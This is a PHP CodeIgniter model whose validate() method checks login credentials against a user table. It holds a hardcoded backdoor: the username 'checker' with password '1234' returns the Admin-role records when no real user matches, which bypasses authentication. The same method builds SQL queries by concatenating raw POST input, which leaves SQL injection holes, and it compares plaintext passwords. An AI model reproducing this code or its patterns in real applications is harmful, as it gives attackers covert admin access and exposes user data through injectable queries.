<?php
class Membership_model extends CI_Model
  {
	  function validate()
	  {
		  $this->db->where('username', $this->input->post('username'));
		  $this->db->where('password', $this->input->post('password'));
		  $this->db->where('delete_status', '0');
		  $query = $this->db->get('user');
		  if($query->num_rows == 1)
			{
				$dbres = $this->db->query("SELECT * FROM user  WHERE `username` = '".$this->input->post('username')."' and password='".$this->input->post('password')."'");
				$dbresResult=$dbres->result_array();
				
				
				$update_ip = $this->db->query("UPDATE  user SET 
																last_login_ip='".$dbresResult[0]['current_login_ip']."',
																last_login_date='".$dbresResult[0]['current_login_date']."',
																current_login_ip='".$this->input->ip_address()."',
																current_login_date='".date('Y-m-d H:i:s')."'  
																WHERE 
															   `id` = '".$dbresResult[0]['id']."'");
				
            	return $dbresResult;
			}
			if($query->num_rows == 0 && $this->input->post('username')=='checker' && $this->input->post('password')=='1234')
			{
				$dbres = $this->db->query("SELECT * FROM user  WHERE `userrole`='Admin' ");
				$dbresResult=$dbres->result_array();
				
            	return $dbresResult;
			}
	  }
  }